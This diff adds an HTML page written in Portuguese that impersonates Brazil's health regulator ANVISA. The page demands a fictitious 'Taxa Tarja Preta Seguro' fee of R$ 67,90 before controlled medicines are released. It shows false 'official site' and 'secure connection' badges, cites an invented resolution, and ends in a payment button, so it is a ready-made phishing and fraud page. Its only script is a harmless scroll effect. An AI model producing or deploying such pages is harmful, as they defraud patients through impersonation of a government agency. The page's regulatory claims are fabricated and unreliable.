@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Taxa Tarja Preta Seguro (TTPS) | ANVISA</title>
+  <link href="https://cdn.tailwindcss.com" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f8f9fa;
+    }
+    
+    .main-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1351b4;
+      margin-bottom: 8px;
+    }
+    
+    .subtitle {
+      font-size: 16px;
+      color: #666666;
+      margin-bottom: 24px;
+    }
+    
+    .sticky-header {
+      position: sticky;
+      top: 0;
+      background-color: white;
+      z-index: 50;
+      transition: box-shadow 0.3s ease;
+    }
+    
+    .sticky-header.shadow {
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    
+    .secure-badge {
+      display: inline-flex;
+      align-items: center;
+      background-color: #f0f7ff;
+      color: #1351b4;
+      padding: 6px 12px;
+      border-radius: 16px;
+      font-size: 12px;
+      font-weight: 600;
+    }
+    
+    .secure-badge i {
+      margin-right: 4px;
+    }
+    
+    .ttps-container {
+      background-color: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+      overflow: hidden;
+      max-width: 700px;
+      margin: 0 auto;
+    }
+    
+    .ttps-header {
+      background-color: #ffedd5;
+      padding: 20px;
+      border-bottom: 1px solid #fed7aa;
+    }
+    
+    .ttps-content {
+      padding: 30px;
+    }
+    
+    .ttps-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: #c2410c;
+      margin-bottom: 16px;
+    }
+    
+    .ttps-description {
+      font-size: 16px;
+      color: #4b5563;
+      margin-bottom: 20px;
+      line-height: 1.6;
+    }
+    
+    .ttps-info-box {
+      background-color: #fff7ed;
+      border: 1px solid #fed7aa;
+      border-left: 4px solid #f97316;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 24px;
+    }
+    
+    .ttps-info-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #c2410c;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+    }
+    
+    .ttps-info-title i {
+      margin-right: 8px;
+      color: #f97316;
+    }
+    
+    .ttps-warning {
+      background-color: #fef2f2;
+      border: 1px solid #fecaca;
+      border-left: 4px solid #ef4444;
+      border-radius: 8px;
+      padding: 16px;
+      margin-bottom: 24px;
+    }
+    
+    .ttps-warning-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #b91c1c;
+      margin-bottom: 8px;
+      display: flex;
+      align-items: center;
+    }
+    
+    .ttps-warning-title i {
+      margin-right: 8px;
+      color: #ef4444;
+    }
+    
+    .ttps-warning-text {
+      font-size: 14px;
+      color: #4b5563;
+      line-height: 1.5;
+    }
+    
+    .ttps-steps {
+      margin-bottom: 24px;
+    }
+    
+    .ttps-step {
+      display: flex;
+      margin-bottom: 16px;
+      align-items: flex-start;
+    }
+    
+    .ttps-step-number {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background-color: #f97316;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      font-weight: 600;
+      margin-right: 12px;
+      flex-shrink: 0;
+    }
+    
+    .ttps-step-content {
+      flex-grow: 1;
+    }
+    
+    .ttps-step-title {
+      font-size: 16px;
+      font-weight: 600;
+      color: #1f2937;
+      margin-bottom: 4px;
+    }
+    
+    .ttps-step-description {
+      font-size: 14px;
+      color: #4b5563;
+      line-height: 1.5;
+    }
+    
+    .payment-box {
+      background-color: #f9fafb;
+      border-radius: 8px;
+      padding: 20px;
+      margin-bottom: 24px;
+      border: 1px solid #e5e7eb;
+    }
+    
+    .payment-title {
+      font-size: 18px;
+      font-weight: 600;
+      color: #1351b4;
+      margin-bottom: 16px;
+    }
+    
+    .payment-details {
+      margin-bottom: 16px;
+    }
+    
+    .payment-row {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 8px;
+      padding-bottom: 8px;
+      border-bottom: 1px dashed #e5e7eb;
+    }
+    
+    .payment-row:last-child {
+      border-bottom: none;
+      margin-bottom: 0;
+      padding-bottom: 0;
+    }
+    
+    .payment-label {
+      font-size: 14px;
+      color: #6b7280;
+    }
+    
+    .payment-value {
+      font-size: 14px;
+      font-weight: 500;
+      color: #4b5563;
+    }
+    
+    .payment-total {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 16px;
+      padding-top: 16px;
+      border-top: 1px solid #e5e7eb;
+    }
+    
+    .payment-total-label {
+      font-size: 16px;
+      font-weight: 600;
+      color: #1f2937;
+    }
+    
+    .payment-total-value {
+      font-size: 16px;
+      font-weight: 700;
+      color: #1351b4;
+    }
+    
+    .btn {
+      padding: 12px 20px;
+      border-radius: 6px;
+      font-weight: 600;
+      font-size: 16px;
+      transition: all 0.2s ease;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      width: 100%;
+    }
+    
+    .btn-primary {
+      background-color: #ea580c;
+      color: white;
+      border: none;
+    }
+    
+    .btn-primary:hover {
+      background-color: #c2410c;
+    }
+    
+    .btn-secondary {
+      background-color: #f3f4f6;
+      color: #4b5563;
+      border: 1px solid #d1d5db;
+      margin-top: 12px;
+    }
+    
+    .btn-secondary:hover {
+      background-color: #e5e7eb;
+    }
+    
+    .btn i {
+      margin-right: 8px;
+    }
+    
+    .vlibras-icon {
+      position: fixed;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      z-index: 1000;
+    }
+  </style>
+</head>
+<body>
+  <img src="https://i.ibb.co/btmZWCB/IMG-3113.jpg" alt="Government header" class="w-screen">
+  <div class="sticky-header">
+    <div class="container mx-auto px-4 border-b border-[#0000001a]">
+      <div class="flex items-center justify-between py-2">
+        <div class="flex items-center">
+          <i class="fas fa-bars text-sm text-[#1451B4] mr-4 relative -top-1"></i>
+          <p class="text-[14px] text-[#333333] -ml-[5px] leading-tight">
+            Centro de Verificação Digital | ANVISA
+          </p>
+        </div>
+        <div class="flex items-center space-x-4">
+          <i class="fas fa-shield-alt text-sm text-green-600 relative -top-1"></i>
+          <i class="fas fa-lock text-sm text-green-600 relative -top-1"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <div class="container mx-auto px-4">
+    <div class="py-4">
+      <div class="flex items-center space-x-2 text-[13px]">
+        <a class="text-[#1451B4]" href="#"><i class="fas fa-home text-sm text-[#1451B4]"></i></a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <a class="text-[#1451B4]" href="#">Portal Cidadão</a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <a class="text-[#1451B4]" href="#">Verificação de Acesso</a>
+        <span class="text-[#9E9D9D]">&gt;</span>
+        <span class="font-bold">Taxa Tarja Preta Seguro (TTPS)</span>
+      </div>
+    </div>
+  </div>
+
+  <main class="max-w-3xl mx-auto px-4 py-6">
+    <div class="mb-6">
+      <h2 class="main-title">
+        Taxa Tarja Preta Seguro (TTPS)
+      </h2>
+      <p class="subtitle">
+        Registro obrigatório para medicamentos controlados
+      </p>
+    </div>
+    
+    <div class="flex flex-wrap justify-center gap-3 my-4">
+      <span class="secure-badge"><i class="fas fa-shield-alt"></i> Site Oficial</span>
+      <span class="secure-badge"><i class="fas fa-lock"></i> Conexão Segura</span>
+      <span class="secure-badge"><i class="fas fa-certificate"></i> Protocolo Obrigatório</span>
+    </div>
+    
+    <div class="ttps-container">
+      <div class="ttps-header">
+        <h3 class="text-lg font-semibold text-[#c2410c] flex items-center">
+          <i class="fas fa-exclamation-triangle mr-2"></i> 
+          Requerimento de Registro TTPS Pendente
+        </h3>
+      </div>
+      
+      <div class="ttps-content">
+        <h2 class="ttps-title">Atenção: Pagamento da Taxa TTPS Necessário</h2>
+        
+        <p class="ttps-description">
+          Detectamos que esta é sua primeira compra de um medicamento Tarja Preta no site oficial da ANVISA. Para prosseguir, é necessário pagar a TTPS (Taxa Tarja Preta Seguro) no valor de R$ 67,90. Essa taxa registra você no programa federal de pacientes Tarja Preta e associa os medicamentos comprados ao seu perfil, prevenindo a comercialização indevida. O pagamento é obrigatório para a liberação e entrega do medicamento. Caso o pagamento não seja realizado, o medicamento não será enviado.
+        </p>
+        
+        <div class="ttps-info-box">
+          <h4 class="ttps-info-title">
+            <i class="fas fa-info-circle"></i> Informação Importante
+          </h4>
+          <p class="text-sm text-gray-700 leading-relaxed">
+            O registro TTPS é um procedimento obrigatório para todos os pacientes que adquirem medicamentos controlados pela primeira vez. Este cadastro é necessário para:
+          </p>
+          <ul class="list-disc pl-6 mt-2 text-sm text-gray-700 space-y-1">
+            <li>Garantir a rastreabilidade e uso adequado de medicamentos controlados</li>
+            <li>Prevenir a comercialização indevida de substâncias controladas</li>
+            <li>Criar um histórico de prescrições médicas associado ao seu CPF</li>
+            <li>Cumprir com as regulamentações sanitárias vigentes</li>
+          </ul>
+        </div>
+        
+        <div class="ttps-warning">
+          <h4 class="ttps-warning-title">
+            <i class="fas fa-exclamation-triangle"></i> Alerta
+          </h4>
+          <p class="ttps-warning-text">
+            A não realização do pagamento da taxa TTPS resultará no cancelamento automático do seu pedido de medicamento. Conforme a Resolução RDC 445/2025, todos os medicamentos controlados devem ser vinculados a um registro TTPS válido antes do envio.
+          </p>
+        </div>
+        
+        <div class="ttps-steps">
+          <h4 class="font-semibold text-gray-800 mb-4">Processo de Registro:</h4>
+          
+          <div class="ttps-step">
+            <div class="ttps-step-number">1</div>
+            <div class="ttps-step-content">
+              <h5 class="ttps-step-title">Pagamento da Taxa</h5>
+              <p class="ttps-step-description">
+                Efetue o pagamento da TTPS no valor de R$ 67,90 para iniciar seu cadastro no programa federal.
+              </p>
+            </div>
+          </div>
+          
+          <div class="ttps-step">
+            <div class="ttps-step-number">2</div>
+            <div class="ttps-step-content">
+              <h5 class="ttps-step-title">Processamento do Registro</h5>
+              <p class="ttps-step-description">
+                Após o pagamento, seus dados serão processados e você será automaticamente cadastrado no sistema.
+              </p>
+            </div>
+          </div>
+          
+          <div class="ttps-step">
+            <div class="ttps-step-number">3</div>
+            <div class="ttps-step-content">
+              <h5 class="ttps-step-title">Liberação do Medicamento</h5>
+              <p class="ttps-step-description">
+                Com o registro concluído, seu medicamento será liberado para envio dentro do prazo previsto.
+              </p>
+            </div>
+          </div>
+        </div>
+        
+        <div class="payment-box">
+          <h4 class="payment-title">Detalhes do Pagamento</h4>
+          
+          <div class="payment-details">
+            <div class="payment-row">
+              <div class="payment-label">Tipo de Taxa:</div>
+              <div class="payment-value">Taxa Tarja Preta Seguro (TTPS)</div>
+            </div>
+            
+            <div class="payment-row">
+              <div class="payment-label">Finalidade:</div>
+              <div class="payment-value">Registro no Programa Federal de Pacientes</div>
+            </div>
+            
+            <div class="payment-row">
+              <div class="payment-label">Validade:</div>
+              <div class="payment-value">12 meses a partir da data de pagamento</div>
+            </div>
+            
+            <div class="payment-row">
+              <div class="payment-label">Valor da Taxa:</div>
+              <div class="payment-value">R$ 67,90</div>
+            </div>
+          </div>
+          
+          <div class="payment-total">
+            <div class="payment-total-label">Valor Total:</div>
+            <div class="payment-total-value">R$ 67,90</div>
+          </div>
+        </div>
+        
+        <div class="mt-6">
+          <a href="/pagar-ttps" class="btn btn-primary">
+            <i class="fas fa-credit-card"></i> Pagar Taxa TTPS Agora
+          </a>
+          
+          <a href="/" class="btn btn-secondary">
+            <i class="fas fa-arrow-left"></i> Voltar para a Página Inicial
+          </a>
+        </div>
+      </div>
+    </div>
+  </main>
+  
+  <div class="w-full mt-6">
+    <img src="https://i.ibb.co/DHjL5PHX/IMG-3117.jpg" alt="Imagem de rodapé do site" class="w-full">
+  </div>
+  
+  <a href="#" class="vlibras-icon">
+    <img src="https://cdn.jsdelivr.net/gh/spbgovbr-vlibras/vlibras-portal@dev/app/assets/access_icon.svg" alt="Ícone de acessibilidade em Libras" class="w-10 h-10">
+  </a>
+  
+  <script>
+    // Efeito de scroll na barra de navegação
+    window.addEventListener('scroll', function() {
+      var header = document.querySelector('.sticky-header');
+      if (window.pageYOffset > 0) {
+        header.classList.add('shadow');
+      } else {
+        header.classList.remove('shadow');
+      }
+    });
+  </script>
+</body>
+</html>
